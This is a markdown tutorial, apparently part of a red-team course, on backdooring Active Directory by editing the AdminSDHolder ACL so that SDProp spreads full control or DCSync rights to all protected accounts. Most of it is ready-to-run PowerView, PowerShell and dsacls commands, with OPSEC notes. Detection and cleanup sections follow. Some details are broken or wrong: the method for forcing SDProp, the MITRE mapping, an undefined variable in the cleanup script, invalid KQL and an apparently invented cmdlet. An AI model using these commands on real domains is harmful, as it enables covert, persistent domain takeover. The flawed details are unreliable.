# AdminSDHolder Persistence

## Overview

**AdminSDHolder** (AdminSDHolder) is a special AD container that acts as a **security template** for all privileged accounts and groups in Active Directory. A background process called **SDProp** (Security Descriptor Propagator) runs every **60 minutes** (by default) and compares the ACL of all protected objects to the ACL of the AdminSDHolder object. If any differences are found, the protected object's ACL is **overwritten** to match AdminSDHolder.

This means: if you modify the **AdminSDHolder object's ACL** to grant a backdoor user full control, **SDProp will propagate those permissions to every protected account and group in the domain within 60 minutes**.

**Key Advantage:** The backdoor user gains automatic full control over DA, EA, Schema Admins, and all other protected groups — and this persists even after the 60-minute SDProp cycle. Removing the backdoor user from Domain Admins manually will be reverted within the hour.

---

## Prerequisites

- **Domain Admin** privileges (to modify the AdminSDHolder ACL)
- Tools: PowerView, Active Directory PowerShell module, ADSI Edit, `dsacls.exe`
- Understanding of AD ACLs and SDProp

---

## Step 1: Identify the AdminSDHolder Object

The AdminSDHolder object is located at:

```
CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local
```

### Find via PowerShell (Active Directory module)

```powershell
Import-Module ActiveDirectory
Get-ADObject "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local"
```

### Find via ADSI Edit

1. Open ADSI Edit
2. Connect to the **Default naming context**
3. Navigate to `CN=System,DC=targetdomain,DC=local`
4. Look for `CN=AdminSDHolder`

### Find via PowerView

```powershell
Get-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local"
```

---

## Step 2: Modify the AdminSDHolder ACL

### Using PowerView (Add-DomainObjectAcl)

**Grant a user full control (GenericAll) over AdminSDHolder:**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local' -PrincipalIdentity backdoor_user -Rights All
```

**Grant a group full control:**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local' -PrincipalIdentity "BACKDOOR GROUP" -Rights All
```

**Grant specific extended rights (e.g., Reset Password, DCSync):**

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local' -PrincipalIdentity backdoor_user -Rights ResetPassword

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local' -PrincipalIdentity backdoor_user -Rights DCSync
```

### Using Active Directory PowerShell Module (Set-Acl / Get-Acl)

```powershell
$path = "AD:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local"
$acl = Get-Acl $path
$user = New-Object System.Security.Principal.NTAccount("targetdomain\backdoor_user")
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $user,
    "GenericAll",
    "Allow"
)
$acl.AddAccessRule($accessRule)
Set-Acl -Path $path -AclObject $acl
```

### Using dsacls.exe (Legacy tool on DC)

```cmd
dsacls "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local" /G "targetdomain\backdoor_user:GA"
```

### Using ADSI Edit (GUI)

1. Right-click `CN=AdminSDHolder` > **Properties**
2. Go to the **Security** tab
3. Click **Add** → enter `backdoor_user` → Click **OK**
4. Grant **Full Control**
5. Click **OK**

---

## Step 3: Wait for SDProp Propagation

SDProp runs every **60 minutes** by default. After the cycle runs, the backdoor user will have full control over **all protected accounts and groups**.

### Check the SDProp Interval

```powershell
Get-ADObject "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local" -Properties adminSDPropInterval
```

Default is `60` minutes.

### Force SDProp (optional — requires restarting services)

SDProp runs every hour automatically but can be triggered manually by restarting the **Kerberos Key Distribution Center** service on a DC:

```cmd
net stop kdc && net start kdc
```

> **Warning:** Restarting KDC interrupts Kerberos authentication on the DC. Not recommended in production.

---

## Step 4: Verify the Backdoor

After SDProp runs:

### Check that the backdoor user has inherited rights on a Domain Admin account

```powershell
Get-Acl "AD:CN=Administrator,CN=Users,DC=targetdomain,DC=local" | Select-Object -ExpandProperty Access | Where-Object {$_.IdentityReference -eq "targetdomain\backdoor_user"}
```

### Verify via PowerView

```powershell
Get-DomainObjectAcl -Identity "CN=Administrator,CN=Users,DC=targetdomain,DC=local" | Where-Object {$_.SecurityIdentifier -eq (Convert-NameToSid "targetdomain\backdoor_user")}
```

### Determine if an Account is AdminCount Protected

```powershell
Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount, memberOf
```

All users with `adminCount = 1` are protected by AdminSDHolder.

---

## What Accounts/Groups Are Protected?

By default, the following groups (and their members) are protected:

| Group | Well-Known SID |
|-------|---------------|
| Account Operators | S-1-5-32-548 |
| Administrators | S-1-5-32-544 |
| Backup Operators | S-1-5-32-551 |
| Domain Admins | S-1-5-21-*-512 |
| Domain Controllers | S-1-5-21-*-516 |
| Enterprise Admins | S-1-5-21-*-519 |
| Print Operators | S-1-5-32-550 |
| Read-only Domain Controllers | S-1-5-21-*-521 |
| Replicator | S-1-5-32-552 |
| Schema Admins | S-1-5-21-*-518 |
| Server Operators | S-1-5-32-549 |

Any user who is a **member** of one of these groups gets `adminCount=1` and inherits AdminSDHolder ACLs.

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **Event 5136** | Modifying the AdminSDHolder ACL generates event 5136 (Directory Service Change). |
| **AdminSDHolder Object** | The AdminSDHolder object is not normally modified. Changes are highly anomalous. |
| **No Immediate Effect** | Changes take up to 60 minutes to propagate. Investigators could detect the ACL change before it's used. |
| **Clear Backdoor User** | The backdoor user can be identified by examining AdminSDHolder's ACL. |
| **adminCount Attribute** | Adding a user to a protected group sets `adminCount=1` — this is a flag that defenders look for. |
| **SDProp Interval** | Defenders can shorten the SDProp interval or enable auditing on AdminSDHolder. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **5136** | A directory service object was modified (AdminSDHolder ACL changed) | DC Security Log |
| **5141** | A directory service object was deleted | DC Security Log |
| **4738** | A user account was changed (`adminCount` attribute changed) | DC Security Log |
| **5137** | A directory service object was created (backdoor user) | DC Security Log |

### Detection Indicators

1. **Event 5136 on AdminSDHolder** — Any modification to AdminSDHolder is suspicious
2. **SID of non-privileged user in AdminSDHolder ACL** — Only built-in privileged accounts (SYSTEM, Domain Admins, Enterprise Admins) should have modify rights on AdminSDHolder
3. **Unusual accounts gaining access to protected objects** — Monitor for privilege escalations that coincide with SDProp cycles
4. **Back in 60 minutes** — A user who is removed from Domain Admins but reappears at the next hour

### Detection Queries

**KQL — AdminSDHolder ACL Modification:**

```
SecurityEvent
| where EventID == 5136
| where ObjectDN contains "AdminSDHolder"
```

**KQL — SDProp Propagation (adminCount toggle):**

```
SecurityEvent
| where EventID == 4738
| where TargetUserName == "backdoor_user"
| where AdminCount changed from 0 to 1
```

### Monitoring Recommendations

1. **Alert on any 5136 event where the object is AdminSDHolder**
2. **Audit membership changes to protected groups** (event 4728, 4732, 4746, 4751, 4756, 4761)
3. **Regularly compare the AdminSDHolder DACL against a known-good baseline**
4. **Set an audit ACE on AdminSDHolder** to log all access

---

## Cleanup / Reversal

### Remove the Backdoor User from AdminSDHolder ACL

```powershell
$path = "AD:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local"
$acl = Get-Acl $path
$user = New-Object System.Security.Principal.NTAccount("targetdomain\backdoor_user")
$acl.RemoveAccessRule($accessRule)  # Remove the previously added rule
Set-Acl -Path $path -AclObject $acl
```

### Using PowerView

```powershell
Remove-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local' -PrincipalIdentity backdoor_user -Rights All
```

### Using dsacls.exe

```cmd
dsacls "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local" /R "targetdomain\backdoor_user"
```

### Reset AdminSDHolder to Default

To restore the default AdminSDHolder ACL:

1. Open **ADSI Edit**
2. Connect to **Default naming context**
3. Navigate to `CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local`
4. Right-click > **Properties** > **Security** tab
5. Click **Advanced** > **Reset permissions** (if available)

Or use the `Set-ADObject` to delete the bad ACEs.

### Remove the Backdoor User

```powershell
Remove-ADUser -Identity backdoor_user -Confirm:$false
```

### Force SDProp after Cleanup

To force SDProp to run and restore proper ACLs:

```powershell
# Option 1: Wait 60 minutes (default behavior)
# Option 2: Restart KDC (not recommended in production)
```

### Verify Cleanup

```powershell
Get-ADObject "CN=AdminSDHolder,CN=System,DC=targetdomain,DC=local" | Get-Acl | Select-Object -ExpandProperty Access
```

Verify that only the default privileged accounts (SYSTEM, Domain Admins, Enterprise Admins, etc.) have modify access.

### Post-Cleanup

- Audit all users with `adminCount=1` to ensure no unauthorized protected group members
- Review the AdminSDHolder ACL weekly for a period after cleanup
- Consider adding a monitoring rule specifically for AdminSDHolder modifications
- Ensure that the SDProp process is running correctly (`Invoke-ADCheckMemberGroupConsistency`)

---

## References

- [ADSecurity — AdminSDHolder Backdoor](https://adsecurity.org/?p=1906)
- [PowerView — Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/)
- [Microsoft — AdminSDHolder](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [Harmj0y — AdminSDHolder Persistence](http://blog.harmj0y.net/redteaming/abusing-active-directory-acls-adminsdholder/)
- MITRE ATT&CK: T1098.005 (Account Manipulation: Device Registration)

---

**Next:** [07 - SSP Backdoor](07_SSP_Backdoor.md)
